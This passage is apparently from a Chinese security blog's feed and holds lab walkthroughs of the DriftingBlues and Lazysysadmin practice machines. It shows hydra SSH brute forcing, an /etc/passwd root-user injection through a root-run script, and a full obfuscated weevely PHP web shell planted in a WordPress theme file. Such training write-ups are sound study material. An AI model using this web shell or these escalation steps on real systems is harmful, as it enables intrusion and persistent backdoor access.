&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/server-status &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Progress: &lt;span class="m">1102800&lt;/span> / &lt;span class="m">1102805&lt;/span> &lt;span class="o">(&lt;/span>100.00%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Finished&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>首页F12找到信息
&lt;img src="img/20240113170818.png" alt="image.png">&lt;/p>
&lt;p>使用base64解密一下，得到信息&lt;/p>
&lt;p>&lt;img src="img/20240113170905.png" alt="image.png">&lt;/p>
&lt;p>尝试在IP网址后加上访问，发现是使用ook混淆加密的密文
&lt;img src="img/20240113170938.png" alt="image.png">&lt;/p>
&lt;p>在&lt;a href="https://www.splitbrain.org/services/ook">解密网站&lt;/a>解密一下，提示我们使用host文件访问，并出现了eric
&lt;img src="img/20240113171051.png" alt="image.png">&lt;/p>
&lt;p>结合首页频繁出现的信息
&lt;img src="img/20240113171425.png" alt="image.png">&lt;/p>
&lt;p>在&lt;code>vim /etc/host&lt;/code>文件中添加解析&lt;/p>
&lt;p>&lt;img src="img/20240113171748.png" alt="image.png">&lt;/p>
&lt;p>添加好后即可访问成功
&lt;img src="img/20240113172023.png" alt="image.png">&lt;/p>
&lt;p>这里我们再尝试使用gobuster进行目录爆破
使用gobuster进行本地域名爆破,这里如果出现错误无法扫描成功的话，重启一下靶机，再把刚刚填写上的数据删掉，再填写一次，最后再次尝试即可解决问题&lt;code>gobuster host -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt&lt;/code>&lt;/p>
&lt;p>&lt;img src="img/20240114143110.png" alt="image.png">&lt;/p>
&lt;p>将test.driftingblues.box再写入host&lt;/p>
&lt;p>&lt;img src="img/20240114143144.png" alt="image.png">&lt;/p>
&lt;p>dirb 进行 web 目录扫描
&lt;img src="img/20240114163342.png" alt="image.png">&lt;/p>
&lt;p>访问 robots.txt 页面
&lt;img src="img/20240114163400.png" alt="image.png">&lt;/p>
&lt;p>再访问 / ssh_cred.txt，得到下面内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">we can use ssh password in case of emergency. it was &amp;#34;1mw4ckyyucky&amp;#34;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sheryl once told me that she added a number to the end of the password.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-db
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用 hydra 进行 ssh 暴力破解&lt;/p>
&lt;pre tabindex="0">&lt;code>hydra -l eric -P pass.txt 192.168.132.158 ssh
&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240114163623.png" alt="image.png">&lt;/p>
&lt;p>这里我们尝试使用SSH远程登录
&lt;img src="img/20240114163247.png" alt="image.png">&lt;/p>
&lt;p>找到第一个Flag
&lt;img src="img/20240114163654.png" alt="image.png">&lt;/p>
&lt;p>&lt;strong>提权&lt;/strong>&lt;/p>
&lt;p>在&lt;code>/var/backups&lt;/code> 目录下发现了一个&lt;code>backup.sh&lt;/code>文件，查看该文件发现所属用户和组属性都为root权限
&lt;img src="img/20240114165010.png" alt="image.png">&lt;/p>
&lt;p>查看该文件&lt;/p>
&lt;p>&lt;img src="img/20240114165212.png" alt="image.png">&lt;/p>
&lt;pre tabindex="0">&lt;code>这个脚本看起来是一个简单的备份脚本，它使用 `zip` 命令将 `/var/www/` 目录下的内容打包成一个压缩文件 `/tmp/backup.zip`。然后，它尝试使用 `/bin/chmod` 命令，但是缺少参数，因此这行命令可能有错误。
另外，脚本的最后一行 `sudo /tmp/emergency` 表明它在 `/tmp/` 目录下执行了一个名为 `emergency` 的文件，并且可以用 sudo 去执行这个文件。
因此这里我们可以在这个文件中写入 `echo &amp;#34;jack:IGhvWxGrSeLnU:0:0::/root:/bin/bash&amp;#34;&amp;gt;&amp;gt;/etc/passwd`这条命令，向/etc/passwd 文件中写入超级用户以提权（密码为jack）
&lt;/code>&lt;/pre>&lt;p>这里我们使用vi编辑器创建 emergency 文件，并写入创建用户命令&lt;/p>
&lt;p>&lt;img src="img/20240114171316.png" alt="image.png">
创建写入成功后，&lt;code>chmod +x emergency&lt;/code> 赋予其可执行权限&lt;/p>
&lt;p>接下来可以使用 &lt;a href="https://www.4hou.com/posts/JNKD">pspy&lt;/a> 来监听&lt;code>backup.sh&lt;/code>进程，监听可知该进程是一个自动执行的进程&lt;/p>
&lt;p>可以看到&lt;code>backup.sh&lt;/code>文件已经帮我们写入成功了&lt;/p>
&lt;p>&lt;img src="img/20240114171958.png" alt="image.png">&lt;/p>
&lt;p>切换到jack用户，现在已经提权成功了&lt;/p>
&lt;p>&lt;img src="img/20240114172121.png" alt="image.png">&lt;/p>
&lt;p>夺旗 flag2&lt;/p>
&lt;p>&lt;img src="img/20240114172521.png" alt="image.png">&lt;/p></description></item><item><title>靶机：Lazysysadmin</title><link>https://www.inecho.cc/zh-cn/2023/09/16/%E9%9D%B6%E6%9C%BAlazysysadmin/</link><pubDate>Sat, 16 Sep 2023 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2023/09/16/%E9%9D%B6%E6%9C%BAlazysysadmin/</guid><description>&lt;h5 id="1-信息收集">1 信息收集&lt;/h5>
&lt;p>nmap 扫描当前网段&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.9.75.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>确认靶机 IP：10.9.75.90，对其进行详细扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# nmap -sV -p- 10.9.75.90
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-08 20:57 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> bogon &lt;span class="o">(&lt;/span>10.9.75.90&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.00071s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65529&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.7 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MySQL &lt;span class="o">(&lt;/span>unauthorized&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6667/tcp open irc InspIRCd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MAC Address: 08:00:27:DB:1B:BD &lt;span class="o">(&lt;/span>Oracle VirtualBox virtual NIC&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Hosts: LAZYSYSADMIN, Admin.local&lt;span class="p">;&lt;/span> OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 15.75 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>信息分析：ssh、samba 服务均开启&lt;/p>
&lt;p>使用 dirb 对其进行隐藏目录扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# dirb http://10.9.75.90
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DIRB v2.22
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">By The Dark Raver
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">START_TIME: Fri Dec &lt;span class="m">8&lt;/span> 20:59:29 &lt;span class="m">2023&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">URL_BASE: http://10.9.75.90/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GENERATED WORDS: &lt;span class="m">4612&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Scanning URL: http://10.9.75.90/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/apache/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/index.html &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:36072&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/info.php &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:77223&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/javascript/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/old/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/phpmyadmin/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/robots.txt &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:92&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/server-status &lt;span class="o">(&lt;/span>CODE:403&lt;span class="p">|&lt;/span>SIZE:290&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/test/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/wordpress/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/wp/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/apache/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/javascript/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/javascript/jquery/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/old/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/phpmyadmin/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/phpmyadmin/favicon.ico &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:18902&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/phpmyadmin/index.php &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:8259&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/phpmyadmin/js/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/phpmyadmin/libraries &lt;span class="o">(&lt;/span>CODE:403&lt;span class="p">|&lt;/span>SIZE:297&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/phpmyadmin/locale/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/phpmyadmin/phpinfo.php &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:8261&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/phpmyadmin/setup &lt;span class="o">(&lt;/span>CODE:401&lt;span class="p">|&lt;/span>SIZE:456&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/phpmyadmin/themes/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/test/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.75.90/wordpress/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/wordpress/index.php &lt;span class="o">(&lt;/span>CODE:301&lt;span class="p">|&lt;/span>SIZE:0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/wordpress/wp-admin/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/wordpress/wp-content/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.75.90/wordpress/wp-includes/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.75.90/wordpress/xmlrpc.php &lt;span class="o">(&lt;/span>CODE:405&lt;span class="p">|&lt;/span>SIZE:42&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...............................
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="2-入侵">2 入侵&lt;/h5>
&lt;h6 id="1入侵思路一登录-wordpress-后台">1）入侵思路一：登录 wordpress 后台&lt;/h6>
&lt;p>根据&lt;code>nmap&lt;/code>扫描出来的信息，靶机的 samba 服务为开启状态&lt;/p>
&lt;p>先尝试连接 samba 服务&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#smbclient命令用于查找目标IP的samba服务下的目录&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# smbclient -L 10.9.75.90
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\r&lt;/span>oot&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Sharename Type Comment
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --------- ---- -------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print$ Disk Printer Drivers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> share$ Disk Sumshare
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPC$ IPC IPC Service &lt;span class="o">(&lt;/span>Web server&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Reconnecting with SMB1 &lt;span class="k">for&lt;/span> workgroup listing.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Server Comment
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --------- -------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Workgroup Master
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --------- -------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> WORKGROUP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# smbclient &lt;span class="s1">&amp;#39;\\10.9.75.90\share$&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\r&lt;/span>oot&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Aug &lt;span class="m">15&lt;/span> 07:05:52 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:34:47 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wordpress D &lt;span class="m">0&lt;/span> Fri Dec &lt;span class="m">8&lt;/span> 20:38:27 &lt;span class="m">2023&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Backnode_files D &lt;span class="m">0&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:08:26 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wp D &lt;span class="m">0&lt;/span> Tue Aug &lt;span class="m">15&lt;/span> 06:51:23 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> deets.txt N &lt;span class="m">139&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:20:05 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> robots.txt N &lt;span class="m">92&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:36:14 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> todolist.txt N &lt;span class="m">79&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:39:56 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> apache D &lt;span class="m">0&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:35:19 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> index.html N &lt;span class="m">36072&lt;/span> Sun Aug &lt;span class="m">6&lt;/span> 01:02:15 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> info.php N &lt;span class="m">20&lt;/span> Tue Aug &lt;span class="m">15&lt;/span> 06:55:19 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">test&lt;/span> D &lt;span class="m">0&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:35:10 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> old D &lt;span class="m">0&lt;/span> Mon Aug &lt;span class="m">14&lt;/span> 08:35:13 &lt;span class="m">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3029776&lt;/span> blocks of size 1024. &lt;span class="m">1309832&lt;/span> blocks available
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者：&lt;/p>
&lt;p>&lt;img src="img/20231209113736.png" alt="image.png">&lt;/p>
&lt;p>进来后发现是网站的根目录，先翻找翻找有用的信息&lt;/p>
&lt;p>在&lt;code>smb://10.9.75.90/share$/wordpress/&lt;/code>目录下找到&lt;code>wp-config.php&lt;/code>文件，查看一下&lt;/p>
&lt;p>&lt;img src="img/20231209113946.png" alt="image.png">&lt;/p>
&lt;p>找到 wordpress 的用户名：Admin 密码：TogieMYSQL12345^^&lt;/p>
&lt;p>结合&lt;code>dirb&lt;/code>扫描出来的&lt;code>http://10.9.75.90/wordpress/wp-admin&lt;/code>地址，登录 wordpress 后台&lt;/p>
&lt;p>&lt;img src="img/20231209114253.png" alt="image.png">&lt;/p>
&lt;p>&lt;img src="img/20231209114315.png" alt="image.png">&lt;/p>
&lt;p>使用 weevely 工具，在 kali 中生成木马命令，在当前目录生成一个叫 GameOver.php 的文件密码为 feile&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">weevely generate feile ./GameOver.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20231209142925.png" alt="image.png">&lt;/p>
&lt;p>查看生成的 GameOver.php，将其内容复制到 wordpress 后台中&lt;/p>
&lt;p>&lt;img src="img/20231209143009.png" alt="image.png">&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
$i=&amp;#39;=b$j+=b+,=b$i++){$o.=$t{=b$i}^$k{$j};=b}}return =b$o;}=bi=bf (@preg_match=&amp;#39;;
d=&amp;#39;e($=bm=b[1])=b,$k)));$o=@ob_get_contents=b();@ob=b_=be=bnd_clean();$r=@=bb&amp;#39;;
$y=&amp;#39;ase=b64_encod=be(@x(@gzco=bmpre=bss($o)=b,$=bk))=b;print(&amp;#34;=b$p$kh$r$kf&amp;#34;);}&amp;#39;;
$h=&amp;#39;rlen($t)=b;$o=&amp;#34;&amp;#34;=b;for($i=0=b;$i=b&amp;lt;$l=b;){for($j=0;=b($j&amp;lt;=b=b$c=b&amp;amp;&amp;amp;$i&amp;lt;$l);&amp;#39;;
$F=&amp;#39;b(=b&amp;#34;/$kh=b(.+)$kf/&amp;#34;,@=bf=bile_get_co=bntents(&amp;#34;=bphp=b=b=b://input&amp;#34;),$m=b&amp;#39;;
$B=&amp;#39;$k=&amp;#34;4b=b=b5a0303&amp;#34;;=b$=bkh=&amp;#34;a2bb=b124683ca&amp;#34;;$kf==b&amp;#34;7652fc=bb67=b402=b&amp;#34;;$=bp=&amp;#39;;
$r=str_replace(&amp;#39;jn&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;cjnjnreajntjne_fujnnjnction&amp;#39;);
$k=&amp;#39;)==1) {@ob_star=bt();=b@e=bva=bl(@g=b=bzuncompress(@x(=b@ba=b=bse64_d=becod&amp;#39;;
$K=&amp;#39;=b&amp;#34;jfEd2uBPis=b=bU3ErkH&amp;#34;;functi=bon x($=bt,$=bk){$c=strlen($k)=b;$l=s=bt=b&amp;#39;;
$o=str_replace(&amp;#39;=b&amp;#39;,&amp;#39;&amp;#39;,$B.$K.$h.$i.$F.$k.$d.$y);
$m=$r(&amp;#39;&amp;#39;,$o);$m();
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20231209143138.png" alt="image.png">&lt;/p>
&lt;p>在 kali 终端中访问&lt;/p>
&lt;pre tabindex="0">&lt;code>weevely http://10.9.75.90/wordpress/wp-content/themes/twentyfifteen/404.php feile
&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20231209143610.png" alt="image.png">
&lt;strong>侵入成功！&lt;/strong>&lt;/p>
